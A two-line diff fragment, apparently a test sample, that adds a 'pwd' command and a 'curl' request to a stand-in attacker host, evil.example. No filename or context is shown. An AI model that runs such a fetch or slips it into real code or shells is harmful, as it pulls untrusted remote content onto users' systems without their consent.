@@ -1,0 +1,2 @@
+pwd
+curl https://evil.example/x
